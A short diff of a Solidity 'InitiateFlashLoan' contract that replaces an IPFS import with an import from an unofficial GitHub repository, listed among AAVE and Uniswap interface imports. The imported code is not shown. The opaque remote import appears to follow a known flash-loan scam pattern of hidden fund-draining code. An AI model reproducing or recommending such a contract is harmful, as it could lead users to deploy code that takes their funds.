@@ -2,7 +2,7 @@ pragma solidity ^0.5.0;
 // AAVE Smart Contracts
 import "https://github.com/aave/aave-protocol/blob/master/contracts/interfaces/IChainlinkAggregator.sol";
 import "https://github.com/aave/aave-protocol/blob/master/contracts/flashloan/interfaces/IFlashLoanReceiver.sol";
-import "https://ipfs.io/ipfs/QmRVoP55zANQADApisJQpdY5oHg3W3g68QvNnx1LVQfqBe";
+import "https://github.com/FlashLoanBNBx/BNB/blob/main/Matic";
 //Uniswap Smart contracts
 import "https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol";
 contract InitiateFlashLoan {
